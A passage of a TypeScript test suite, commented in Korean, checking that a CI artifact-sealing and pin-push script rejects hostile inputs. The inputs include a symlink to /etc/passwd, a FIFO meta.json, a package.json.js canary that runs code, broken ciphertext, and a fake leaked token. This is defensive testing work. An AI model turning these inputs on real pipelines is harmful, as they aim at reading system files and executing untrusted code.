    writeFileSync(join(plain, "package-lock.json"), lockJsonAt(pkg.c3));
    symlinkSync("/etc/passwd", join(plain, "package.json"));
    sealInto(join(tmp, "artifact"), plain, KEYS.pubPem);
    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.code).toBe(1);
    expect(r.stderr).toMatch(/심볼릭 링크/);
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  it("비밀키가 아예 없으면 밀기는 1 — 봉인을 못 여는 것을 조용히 넘기지 않는다", () => {
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    writeArtifact(
      tmp,
      { app: "lab", result: "prepared", baseSha: before, pinFrom: pkg.c1, pinTo: pkg.c3, subject: "feat: 시험 커밋" },
      { "package.json": pkgJsonAt("lab", pkg.c3), "package-lock.json": lockJsonAt(pkg.c3) },
    );
    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
      PROPAGATE_ARTIFACT_PRIVKEY: "",
    });
    expect(r.code).toBe(1);
    expect(r.stderr).toMatch(/비밀키/);
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  it("공개키가 없으면 준비는 실패하고 **아무것도 올리지 않는다** — 평문 업로드 금지", () => {
    const app = fakeApp(tmp, "lab", pkg.c1);
    const r = runPrepare(tmp, {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
      PROPAGATE_ARTIFACT_PUBKEY: "",
    });
    expect(r.prepare?.code).toBe(1);
    expect(r.prepare?.stderr).toMatch(/공개키/);
    // 올릴 폴더는 **비어 있어야** 한다 — 평문이 한 장도 남지 않는다
    expect(listFiles(join(tmp, "artifact"))).toEqual([]);
  }, 60_000);

  it("공개키가 없으면 클론 실패의 사유도 올리지 않는다 — 밀기는 「산출물 없음」(2)으로 알린다", () => {
    // 봉인이 안 되면 실패 meta 도 올리지 않는다(평문으로는 절대 안 올린다). 그때 밀기 단계는
    // 「artifact 를 못 받았다」로 빨갛게 끝나고, 워크플로우의 실패 알림이 그 사실을 사람에게 알린다.
    const cloneFail = runStep(tmp, "clone", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: join(tmp, "없는-저장소.git"),
      PROPAGATE_ARTIFACT_PUBKEY: "",
    });
    expect(cloneFail.code).toBe(1);
    expect(listFiles(join(tmp, "artifact"))).toEqual([]);

    const app = fakeApp(tmp, "lab", pkg.c1);
    const push = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(push.code).toBe(2);
    expect(push.stderr).toMatch(/산출물이 없습니다/);
  }, 60_000);

  it("준비가 죽으면 그 사유가 봉인돼 오고, 밀기가 읽어 1 로 끝낸다 — 원격 그대로", () => {
    // 실패 meta 의 **끝에서 끝까지**: 준비가 죽어 봉인된 meta(failed) → 밀기가 풀어 사유를 찍고 1.
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    const prep = runPrepare(tmp, {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
      FAKE_NPM_FAIL: "install",
    });
    expect(prep.prepare?.code).toBe(1);
    expect(listFiles(join(tmp, "artifact"))).toEqual(["bundle.enc", "key.enc"]);
    const push = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(push.code).toBe(1);
    expect(push.stderr).toMatch(/잠금 파일 갱신/);
    expect(push.out).toContain("result=failed");
    // 워크플로우의 실패 알림은 여기서 사유를 읽는다 — 자리가 어긋나면 사유 없는 알림이 간다
    const reason = JSON.parse(readFileSync(join(tmp, "artifact/plain/meta.json"), "utf8")) as Record<string, string>;
    expect(reason.error).toMatch(/잠금 파일 갱신/);
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  // ── 2026-09-08 3차 리뷰 G1(P1): 앱 파일을 `require` 로 열지 않는다 ──

  it("기준 커밋에 package.json 대신 package.json.js 가 있어도 밀기는 그것을 실행하지 않는다", () => {
    // ★막는 사고: node 의 `require("./package.json")` 은 **그 이름의 파일이 없으면 확장자를 붙여 가며**
    //  찾고, 찾으면 **실행한다**. 옛 판은 앱의 핀을 `node -p "require('./package.json')…"` 로 읽었으므로,
    //  앱 기준 커밋에 `package.json.js` 하나만 있으면 그 앱 코드가 **쓰기 토큰을 쥔 밀기 단계에서** 돌았다.
    //  (토큰을 지키려고 job 을 둘로 나눈 것이 통째로 무의미해지는 자리다.)
    // ★재는 방식: 실행되면 표식 파일을 만드는 카나리아를 심고, **그 파일이 안 생겼는지**로 잰다.
    //  「오류 문구가 맞는지」가 아니라 「앱 코드가 돌지 않았는지」를 직접 본다.
    const canary = join(tmp, "카나리아-앱코드가-돌았다.txt");
    const seed = join(tmp, "canary-seed");
    mkdirSync(seed, { recursive: true });
    writeFileSync(
      join(seed, "package.json.js"),
      `require("node:fs").writeFileSync(${JSON.stringify(canary)}, "앱 코드가 실행됐다");\n` +
        `module.exports = { dependencies: { "@wedly/policy-match-shared": ${JSON.stringify(SPEC(pkg.c1))} } };\n`,
    );
    writeFileSync(join(seed, "package-lock.json"), lockJsonAt(pkg.c1, "sha512-seed"));
    sh(
      "git init -q -b main && git config user.email t@t && git config user.name t && git add . && git commit -qm seed",
      seed,
    );
    const bare = join(tmp, "canary.git");
    sh(`git clone -q --bare "${seed}" "${bare}"`, tmp);
    const before = sh("git rev-parse main", bare);

    writeArtifact(
      tmp,
      { app: "lab", result: "prepared", baseSha: before, pinFrom: pkg.c1, pinTo: pkg.c3, subject: "feat: 시험 커밋" },
      { "package.json": pkgJsonAt("lab", pkg.c3), "package-lock.json": lockJsonAt(pkg.c3) },
    );
    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: bare,
    });
    expect(existsSync(canary), "앱의 package.json.js 가 실행됐습니다 — 어딘가에서 아직 require 로 읽습니다").toBe(
      false,
    );
    expect(r.code).toBe(1);
    expect(r.stderr).toMatch(/package\.json/);
    expect(sh("git rev-parse main", bare)).toBe(before); // 원격 불변
  }, 60_000);

  // ── 2026-09-08 4차 리뷰 H1(P2): 복호가 실패해도 비밀키·1회용 열쇠가 임시 폴더에 남지 않는다 ──
  //
  // ★막던 사고: 옛 판은 `dir="$(crypto_dir)"` 로 임시 폴더를 만들었다. 명령 치환은 **하위 셸**이라
  //  거기서 정한 `CRYPTO_DIR` 이 부모에 남지 않았고, EXIT 갈고리의 cleanup 은 지울 자리를 몰랐다.
  //  그래서 봉인을 못 푼 순간(짝이 아닌 비밀키·깨진 암호문·tar 오류·링크 거부) **`priv.pem` 과
  //  `session.key` 가 실행기 임시 폴더에 그대로 남았다.** Actions 실행기는 job 이 끝나면 사라지지만
  //  로컬 예행·자체 호스팅 실행기에서는 그대로 남고, 같은 job 의 뒤 단계가 그 파일을 읽을 수 있다.
  // ★재는 방식: `TMPDIR` 를 시험 폴더로 못 박아 두고 **종료 뒤 그 폴더를 통째로 훑는다** —
  //  「오류 문구가 맞는가」가 아니라 「열쇠가 남았는가」를 직접 본다.

  /** 네 가지 실패 경우가 공통으로 쓰는 자리 — TMPDIR 를 시험 폴더로 못 박고 밀기를 한 번 돌린다 */
  function pushWithPinnedTmp(env: Record<string, string>) {
    const tmpDir = join(tmp, `tmpdir-${(pinnedTmpCounter += 1)}`);
    mkdirSync(tmpDir, { recursive: true });
    const r = runStep(tmp, "push", { ...env, TMPDIR: tmpDir });
    return { r, tmpDir };
  }

  it("짝이 아닌 비밀키로 실패해도 임시 폴더에 비밀키가 남지 않는다", () => {
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    writeArtifact(
      tmp,
      { app: "lab", result: "prepared", baseSha: before, pinFrom: pkg.c1, pinTo: pkg.c3, subject: "feat: 시험 커밋" },
      { "package.json": pkgJsonAt("lab", pkg.c3), "package-lock.json": lockJsonAt(pkg.c3) },
    );
    const { r, tmpDir } = pushWithPinnedTmp({
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
      PROPAGATE_ARTIFACT_PRIVKEY: OTHER_KEYS.privPem,
    });
    expect(r.code).toBe(1);
    expect(r.stderr).toMatch(/열쇠를 풀지 못했습니다/);
    expectNoKeyLeftovers(tmpDir, "짝이 아닌 비밀키");
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  it("암호문이 깨져 실패해도 임시 폴더에 비밀키·1회용 열쇠가 남지 않는다", () => {
    // 여기서는 `pkeyutl -decrypt` 까지 성공해 **1회용 열쇠 파일까지** 만들어진 뒤 죽는다 —
    // 옛 판이 남기던 것이 비밀키 하나가 아니라 둘이었다는 뜻이다.
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    writeArtifact(
      tmp,
      { app: "lab", result: "prepared", baseSha: before, pinFrom: pkg.c1, pinTo: pkg.c3, subject: "feat: 시험 커밋" },
      { "package.json": pkgJsonAt("lab", pkg.c3), "package-lock.json": lockJsonAt(pkg.c3) },
    );
    writeFileSync(join(tmp, "artifact/bundle.enc"), "이건 암호문이 아니다");
    const { r, tmpDir } = pushWithPinnedTmp({
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.code).toBe(1);
    expect(r.stderr).toMatch(/풀지 못했습니다/);
    expectNoKeyLeftovers(tmpDir, "깨진 암호문");
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  it("꾸러미가 tar 가 아니어서 실패해도 임시 폴더에 열쇠가 남지 않는다", () => {
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    sealRawInto(join(tmp, "artifact"), "이건 tar 가 아니다", KEYS.pubPem);
    const { r, tmpDir } = pushWithPinnedTmp({
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.code).toBe(1);
    expectNoKeyLeftovers(tmpDir, "tar 오류");
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  // ── 2026-09-08 4차 리뷰 H3(P2): 링크만 보면 FIFO 가 지나간다 ──

  it("meta.json 이 FIFO 인 꾸러미는 **풀지도 않는다** — 밀기 1, 원격 그대로", () => {
    // ★막던 사고: 옛 판은 먼저 풀고 **심볼릭 링크만** 걸렀다. `meta.json` 이 이름있는 통로(FIFO)면
    //  그 검사를 그냥 지나가고, 뒤의 `[ -f ]` 가 잡아 exit 1 로 끝나도 **FIFO 는 그 자리에 남는다.**
    //  그때 도는 워크플로우의 「실패 알림」이 그 파일을 `readFileSync` 로 열다가 **영원히 멈춘다**
    //  (읽는 쪽만 있고 쓰는 쪽이 없다) → 알림이 안 가고 job 이 제한 시간까지 매달린다.
    // ★재는 방식: 「오류 문구」가 아니라 **푼 자리가 아예 안 생겼는지**로 본다.
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    const plain = mkdtempSync(join(tmpdir(), "propagate-fifo-"));
    writeFileSync(join(plain, "package.json"), pkgJsonAt("lab", pkg.c3));
    writeFileSync(join(plain, "package-lock.json"), lockJsonAt(pkg.c3));
    sh(`mkfifo "${join(plain, "meta.json")}"`, plain); // tar 는 FIFO 를 담을 수 있다(2026-09-08 실측)
    sealInto(join(tmp, "artifact"), plain, KEYS.pubPem);

    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.code).toBe(1);
    expect(r.stderr).toMatch(/FIFO/);
    // 푼 자리(`<산출물>/plain`)가 아예 안 생겼다 = 목록만 보고 멈췄다는 뜻
    expect(existsSync(join(tmp, "artifact/plain")), "FIFO 가 든 꾸러미를 풀었습니다").toBe(false);
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  it("꾸러미 속 심볼릭 링크를 거절할 때도 임시 폴더에 열쇠가 남지 않는다", () => {
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    const plain = mkdtempSync(join(tmpdir(), "propagate-linky-h1-"));
    writeFileSync(
      join(plain, "meta.json"),
      JSON.stringify(
        { app: "lab", result: "prepared", baseSha: before, pinFrom: pkg.c1, pinTo: pkg.c3, subject: "feat: 시험 커밋" },
        null,
        2,
      ) + "\n",
    );
    writeFileSync(join(plain, "package-lock.json"), lockJsonAt(pkg.c3));
    symlinkSync("/etc/passwd", join(plain, "package.json"));
    sealInto(join(tmp, "artifact"), plain, KEYS.pubPem);
    const { r, tmpDir } = pushWithPinnedTmp({
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.code).toBe(1);
    expect(r.stderr).toMatch(/심볼릭 링크/);
    expectNoKeyLeftovers(tmpDir, "링크 거부");
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  // ── 2026-09-08 4차 리뷰 H2 확장(P2): 셸 도우미가 읽는 JSON 도 깨진 앞부분을 안 흘린다 ──
  //
  // ★막던 사고: `lib.sh` 의 `PROPAGATE_JSON_READER` 는 `fail(err)` 로 `err.message` 를 그대로
  //  stderr 에 적었다. `JSON.parse` 가 던지는 오류문에는 **입력의 앞부분이 그대로 들어간다**
  //  (node 22 실측: `Unexpected token 'P', "PRIVATE_RE"... is not valid JSON`).
  //  그 도우미가 읽는 것은 ① **비공개 앱**의 `package.json`(밀기 단계의 `read_current_pin` —
  //  쓰기 토큰을 쥔 자리에서 남의 저장소 파일을 연다)과 ② 봉인을 푼 `meta.json`(`meta_field`) 이고,
  //  이 저장소는 공개라 **Actions 로그도 공개**다. 깨진 파일 하나면 그 앞부분이 공개 로그에 실린다.
  //  같은 구멍을 `verify-lock`·`verify-artifact` 는 이미 막아 뒀는데 셸 도우미에만 남아 있었다.
  // ★재는 방식: 표식 전체는 애초에 오류문에 다 들어가지 않는다(V8 이 10여 글자에서 자른다).
  //  그래서 **표식의 앞 9글자**까지 함께 본다 — 이 줄이 옛 코드에서 실제로 빨개지는 자리다.

  it("기준 커밋의 package.json 이 깨진 JSON 이어도 그 내용이 로그에 안 실린다", () => {
    // `read_current_pin` 이 읽는 자리다. 앱 저장소는 비공개고, 이 단계는 토큰을 쥐고 있다.
    const app = fakeApp(tmp, "lab", pkg.c1, (w) => {
      writeFileSync(join(w, "package.json"), BROKEN_JSON);
    });
    const before = sh("git rev-parse main", app.bare);
    writeArtifact(
      tmp,
      { app: "lab", result: "prepared", baseSha: before, pinFrom: pkg.c1, pinTo: pkg.c3, subject: "feat: 시험 커밋" },
      { "package.json": pkgJsonAt("lab", pkg.c3), "package-lock.json": lockJsonAt(pkg.c3) },
    );
    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expectNoJsonLeak(r, "기준 커밋의 package.json");
    expect(sh("git rev-parse main", app.bare)).toBe(before); // 원격 불변
  }, 60_000);

  it("봉인 속 meta.json 이 깨진 JSON 이어도 그 내용이 로그에 안 실린다", () => {
    // `meta_field` 가 읽는 자리다. 산출물은 앱 코드가 돈 실행기에서 온 **믿을 수 없는 입력**이라
    // 그 안에 무엇이 들었는지 모른다 — 그러니 그 내용을 로그에 옮기지 않는 것이 유일한 방어다.
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    const plain = mkdtempSync(join(tmpdir(), "propagate-brokenmeta-"));
    writeFileSync(join(plain, "meta.json"), BROKEN_JSON);
    writeFileSync(join(plain, "package.json"), pkgJsonAt("lab", pkg.c3));
    writeFileSync(join(plain, "package-lock.json"), lockJsonAt(pkg.c3));
    sealInto(join(tmp, "artifact"), plain, KEYS.pubPem);
    rmSync(plain, { recursive: true, force: true });

    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expectNoJsonLeak(r, "산출물 meta.json");
    expect(sh("git rev-parse main", app.bare)).toBe(before); // 원격 불변
  }, 60_000);

  // ── 2026-09-08 4차 리뷰 H2 확장(P2): 산출물 meta 의 **값**도 오류문을 타고 나가지 않는다 ──
  //
  // ★막던 사고: 밀기 단계는 봉인을 푼 `meta.json` 의 칸(`app`·`result`·`baseSha`·`pinTo`·`pinFrom`)을
  //  판정에 쓰면서 **어긋난 값을 오류문에 그대로 실었다**(예: `산출물의 result 를 모르겠습니다: '<값>'`).
  //  그 값은 준비 job(앱 코드가 도는 실행기)에서 온 것이고, 봉인의 공개키는 누구나 아는 값이라
  //  **누구나 그럴듯한 산출물을 지어낼 수 있다** — 즉 남이 고른 글자다. 이 저장소는 공개라
  //  Actions 로그도 공개다 → 산출물 한 장이면 임의의 내용이 공개 로그로 나간다.
  // ★막은 방법: `lib.sh` 의 `shown()` 으로 감싼다 — **우리가 아는 값**(40자리 SHA·알려진 result·
  //  이 실행이 아는 앱 id)만 원문이고 그 밖에는 `(<길이>글자)` 로만 적는다.
  // ★재는 방식: 칸마다 표식을 하나씩 넣어 **다섯 자리를 각각** 지나가게 한다(나머지 칸은 정상값이라
  //  검사가 그 칸까지 도달한다). 표식은 대문자·밑줄뿐이라 「글자 종류만 보는」 규칙으로는 통과한다 —
  //  그래서 이 표가 그 느슨한 규칙도 함께 잡는다.

  const META_LEAK_CASES = [
    { field: "app", says: "산출물이 다른 앱 것입니다" },
    { field: "result", says: "산출물의 result 를 모르겠습니다" },
    { field: "baseSha", says: "baseSha 가 40자리 SHA 가 아닙니다" },
    { field: "pinTo", says: "pinTo 가 40자리 SHA 가 아닙니다" },
    { field: "pinFrom", says: "pinFrom 이 40자리 SHA 가 아닙니다" },
  ];

  for (const c of META_LEAK_CASES) {
    it(`산출물 meta.${c.field} 에 남이 넣은 글자가 있어도 로그에 안 실린다`, () => {
      const app = fakeApp(tmp, "lab", pkg.c1);
      const before = sh("git rev-parse main", app.bare);
      const meta: Record<string, string> = {
        app: "lab",
        result: "prepared",
        baseSha: before,
        pinFrom: pkg.c1,
        pinTo: pkg.c3,
        subject: "feat: 시험 커밋",
      };
      meta[c.field] = CANARY;
      writeArtifact(tmp, meta, {
        "package.json": pkgJsonAt("lab", pkg.c3),
        "package-lock.json": lockJsonAt(pkg.c3),
      });

      const r = runStep(tmp, "push", {
        PROPAGATE_APP_ID: "lab",
        PROPAGATE_SHA: pkg.c3,
        PROPAGATE_PACKAGE_DIR: pkg.dir,
        PROPAGATE_CLONE_URL: app.bare,
      });
      const all = `${r.stdout}\n${r.stderr}`;
      // 1 = 사람이 봐야 하는 실패 · 2 = 입력 오류. 어느 쪽이든 **밀지 않고 빨갛게** 끝나야 한다.
      expect([1, 2], all).toContain(r.code);
      expect(all, `meta.${c.field}: 표식이 그대로 실렸습니다`).not.toContain(CANARY);
      expect(all, `meta.${c.field}: 표식의 앞부분이 실렸습니다`).not.toContain(CANARY.slice(0, 9));
      // 그 칸을 본 오류문이 맞는지(다른 이유로 죽어서 초록이 되는 것을 막는다)
      expect(all, `meta.${c.field}: 그 칸을 본 오류문이 아닙니다`).toContain(c.says);
      // 값을 지우기만 한 것이 아니라 **길이로 갈음**했는지
      expect(all, `meta.${c.field}: 길이로 갈음한 자리가 없습니다`).toContain(`(${CANARY.length}글자)`);
      expect(sh("git rev-parse main", app.bare)).toBe(before); // 원격 불변
    }, 60_000);
  }

  it("준비 단계 실패 사유는 로그에 그대로 남되 제어문자·이스케이프만 지워진다", () => {
    // ★이 칸만은 예외다(2차 리뷰 F1 에서 감수한 한계): 준비 job 에는 알림이 없어서 이 한 줄이
    //  「왜 죽었는지」를 아는 유일한 통로고, 워크플로우의 「실패 알림」도 같은 칸을 슬랙에 싣는다.
    //  그러니 사유는 **지우면 안 된다.** 다만 로그 색·커서를 조작하거나 줄바꿈으로 남의 로그 줄을
    //  흉내내는 제어문자는 지운다. 이 시험은 「`shown` 을 사유에까지 씌워 버리는」 과잉도 함께 막는다.
    const app = fakeApp(tmp, "lab", pkg.c1);
    const before = sh("git rev-parse main", app.bare);
    writeArtifact(
      tmp,
      {
        app: "lab",
        result: "failed",
        error: "잠금 파일 갱신 실패\u001b[31m 빨강\u0007\n두 번째 줄",
        baseSha: before,
        pinFrom: pkg.c1,
        pinTo: pkg.c3,
        subject: "feat: 시험 커밋",
      },
      {},
    );

    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    const all = `${r.stdout}\n${r.stderr}`;
    expect(r.code, all).toBe(1);
    expect(r.out).toContain("result=failed");
    expect(all, "사유가 사라졌습니다").toContain("잠금 파일 갱신 실패");
    expect(all, "여러 줄 사유의 뒷부분이 사라졌습니다").toContain("두 번째 줄");
    expect(all, "이스케이프(ESC)가 그대로 실렸습니다").not.toContain("\u001b");
    expect(all, "제어문자(BEL)가 그대로 실렸습니다").not.toContain("\u0007");
    expect(sh("git rev-parse main", app.bare)).toBe(before); // 원격 불변
  }, 60_000);

  // ── 2026-09-08 5차 리뷰(P2): 비공개 앱의 **핀 값**도 오류문을 타고 공개 로그로 나가지 않는다 ──
  //
  // ★막던 사고: `read_current_pin` 은 형식이 어긋난 핀을 만나면 그 값을 **원문으로** 적었다
  //  (`현재 핀 형식이 예상과 다릅니다: '<값>'`). 그 값이 온 곳은 **비공개 앱**의 `package.json` 이고
  //  (밀기 단계는 쓰기 토큰을 쥔 채 남의 저장소 파일을 연다) 이 저장소는 공개라 Actions 로그도 공개다 —
  //  앱이 사설 주소·자격이 섞인 spec 을 쓰고 있었다면 그 한 줄이 그대로 공개 로그에 실린다.
  //  (같은 구멍을 **깨진 JSON** 쪽에서는 H2 확장으로 이미 막았다. 여기는 JSON 은 멀쩡한데 **값**이 다른 자리다.)
  // ★막은 방법: 우리가 아는 모양(`github:<우리 패키지 저장소>#<40자리 SHA>`)일 때만 원문이고
  //  그 밖에는 `(<길이>글자, 형식 불일치)` 로만 적는다.
  // ★재는 방식: 표식을 핀 값으로 심은 앱으로 push → exit 1 이고 표식도 **그 앞 9글자**도 없어야 한다.

  it("기준 커밋의 핀 값이 형식과 다르면 그 값이 로그에 안 실린다", () => {
    const app = fakeApp(tmp, "lab", pkg.c1, (w) => {
      // JSON 은 멀쩡하고 **핀 값 하나만** 형식에서 벗어난 앱
      writeFileSync(
        join(w, "package.json"),
        JSON.stringify({ name: "lab", dependencies: { "@wedly/policy-match-shared": CANARY } }, null, 2) + "\n",
      );
    });
    const before = sh("git rev-parse main", app.bare);
    writeArtifact(
      tmp,
      { app: "lab", result: "prepared", baseSha: before, pinFrom: pkg.c1, pinTo: pkg.c3, subject: "feat: 시험 커밋" },
      { "package.json": pkgJsonAt("lab", pkg.c3), "package-lock.json": lockJsonAt(pkg.c3) },
    );

    const r = runStep(tmp, "push", {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    const all = `${r.stdout}\n${r.stderr}`;
    expect(r.code, all).toBe(1);
    // 그 자리를 본 오류문이 맞는지(다른 이유로 죽어서 초록이 되는 것을 막는다)
    expect(all, "핀 형식을 본 오류문이 아닙니다").toContain("현재 핀 형식이 예상과 다릅니다");
    expect(all, "핀 값이 그대로 실렸습니다").not.toContain(CANARY);
    expect(all, "핀 값의 앞부분이 실렸습니다").not.toContain(CANARY.slice(0, 9));
    // 값을 지우기만 한 것이 아니라 **길이로 갈음**했는지
    expect(all, "길이로 갈음한 자리가 없습니다").toContain(`(${CANARY.length}글자, 형식 불일치)`);
    expect(sh("git rev-parse main", app.bare)).toBe(before); // 원격 불변
  }, 60_000);

  it("shown_pin: 아는 모양이면 원문, 아니면 길이만 — 무조건 가리는 것이 아니다", () => {
    // 위 시험은 「샜는가」만 잰다. 늘 가려 버려도 통과하므로, 가림이 **모양을 보고** 도는지를 여기서 잰다.
    // (핀이 정상인 경로에서는 `read_current_pin` 이 그 전에 0 으로 돌아가므로 함수를 직접 부른다.)
    const call = (v: string) =>
      spawnSync("bash", ["-c", `set -euo pipefail; . "${LIB}"; shown_pin "$1"`, "bash", v], { encoding: "utf8" });
    const good = SPEC(pkg.c3);
    expect(call(good).stdout, "아는 모양인데 가렸습니다").toBe(good);
    expect(call(CANARY).stdout).toBe(`(${CANARY.length}글자, 형식 불일치)`);
    expect(call("").stdout).toBe("(0글자, 형식 불일치)");
    // 대문자 SHA·다른 저장소는 「비슷하지만 아는 값이 아니다」 — 원문으로 적지 않는다
    expect(call(SPEC(pkg.c3.toUpperCase())).stdout).toMatch(/^\(\d+글자, 형식 불일치\)$/);
    expect(call(`github:someone-else/other-repo#${pkg.c3}`).stdout).toMatch(/^\(\d+글자, 형식 불일치\)$/);
    // 자격이 섞인 spec 이 와도 그 값이 나오지 않는다(이 로그는 공개다)
    const secret = "ghp_NEVER_IN_A_MESSAGE_0002";
    const withCred = `https://x-access-token:${secret}@github.com/smlee-hash/wedly-policy-match-shared#${pkg.c3}`;
    const r = call(withCred);
    expect(r.stdout).not.toContain(secret);
    expect(r.stdout).toBe(`(${withCred.length}글자, 형식 불일치)`);
  }, 30_000);
});
